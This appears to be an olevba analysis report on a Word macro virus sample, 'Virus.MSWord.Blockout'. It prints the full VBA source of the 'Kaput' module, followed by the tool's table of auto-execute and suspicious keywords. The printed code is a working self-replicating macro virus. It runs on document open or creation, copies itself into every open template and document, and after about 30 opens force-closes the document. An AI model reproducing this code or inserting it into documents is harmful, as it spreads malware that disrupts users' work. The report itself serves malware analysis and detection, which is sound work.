olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Blockout
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Blockout - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Kaput.bas 
in file: ./Virus.MSWord.Blockout - OLE stream: 'Macros/VBA/Kaput'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Sub Autoexec()
  Kaput
End Sub

Sub AutoNew()
  Kaput
End Sub

Sub AutoOpen()
Dim aVar As Object, num As Integer
Kaput

If ThisDocument.Name = "NORMAL.DOT" Then Exit Sub
 
If Len(Dir("c:\windows\lbes.dll")) > 0 Or Day(Date) < 5 Then Exit Sub

For Each aVar In ActiveDocument.Variables
    If aVar.Name = "SX" Then num = aVar.Index
Next aVar
If num = 0 Then
    ActiveDocument.Variables.Add Name:="SX", Value:=1
    num = 1
Else
    ActiveDocument.Variables(num).Value = ActiveDocument.Variables(num).Value + 1
End If
' MsgBox ActiveDocument.Variables(num).Value
If ActiveDocument.Variables(num).Value > 30 Then
 '   MsgBox "No open document. Fatal error. Windows API R/I interface blockOut", vbCritical + vbOKOnly
    ActiveDocument.Close wdSaveChanges
End If

End Sub

Sub Kaput()
Dim openDoc, od As Object, md, ss As Object, fl As Boolean
   
Set md = ThisDocument.VBProject.VBComponents.Item("Kaput")
md.Export ("c:\qq.qq")

For Each openDoc In Templates
With openDoc
  fl = True
  For Each od In .VBProject.VBComponents
     If od.Name = "Kaput" Then fl = False
  Next od
  If fl Then Set ss = .VBProject.VBComponents.Import("c:\qq.qq")
End With
Next openDoc
'----------------------------------------------------------
For Each openDoc In Documents
    With openDoc
      fl = True
      For Each od In .VBProject.VBComponents
        If od.Name = "Kaput" Then fl = False
      Next od
      If fl Then Set ss = .VBProject.VBComponents.Import("c:\qq.qq")
    End With
Next openDoc
Kill "c:\qq.qq"



End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lbes.dll            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

